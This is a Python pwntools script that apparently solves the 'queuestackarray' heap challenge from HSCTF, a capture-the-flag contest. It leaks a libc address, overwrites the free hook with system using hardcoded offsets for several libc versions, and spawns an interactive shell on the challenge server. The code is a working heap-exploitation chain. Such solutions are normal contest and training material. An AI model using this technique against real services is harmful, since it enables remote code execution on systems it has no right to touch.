from pwn import *;

io = remote("queuestackarray.hsctf.com", 1337);

# pushing left decrements head
# pushing right increments tail
def malloc(direction, index, data):
    cmd = "push" + direction * int(direction == "left");
    io.recvuntil(b"> ");
    io.sendline((cmd+str(index)+" ").encode()+data);

# popping left increments head
# popping right decrements tail
def free(direction, index):
    cmd = "pop" + direction * int(direction == "right");
    io.recvuntil(b"> ");
    io.sendline((cmd+str(index)).encode());

# four queues, six pointers in each queue
def view(index, subindex):
    io.recvuntil(b"> ");
    io.sendline(("examine"+str(index)+str(subindex)).encode());
    return io.recvuntil(b'\n')[:-1];

for i in range(7):
    print(i);
    malloc("left", 2, b'Z' * 0x08 + b'\x91');
    malloc("left", 2, b'I' * 0x09);
    for j in range(0x10):
        malloc("left", 1, b'D');
    free("left", 2);
    free("left", 2);
    malloc("right", 1, b'S');

malloc("left", 2, b'Y' * 0x08 + b'\x91');
malloc("left", 2, b'Y' * 0x09);
for i in range(0x10):
    malloc("left", 1, b'\x91' * 9);

free("left", 2);
leak = u64(view(1, 7)+b"\x00\x00");

# 9.0
#hook, system, base = 0x1eeb28, 0x55410, leak - 0x1ebbe0
# 9.7
#hook, system, base = 0x1eee48, 0x522c0, leak - 0x1ecbe0
# 9.9
hook, system, base = 0x1eee48, 0x52290, leak - 0x1ecbe0

print(hex(base));
print(hex(base + hook));
print(hex(base + system));

for i in range(7):
    malloc("right", 1, b'');
    
malloc("left", 4, b'Z' * 0x8 + b'\x41');
malloc("left", 4, b'I' * (0x8 + 1));
malloc("right", 2, b'HEY');
malloc("right", 2, b'YO');

for i in range(0x10):
    malloc("left", 3, b'1' * 0x40);
free("left", 4);

free("right", 2);
free("right", 2);
malloc("right", 3, b'A' * 0x30 + p64(base+hook).replace(b'\x00', b''));
malloc("right", 3, b'\xff'*6);
malloc("right", 3, p64(base+system).replace(b'\x00', b''));
malloc("right", 1, b"/bin/sh");
free("right", 1);

io.interactive();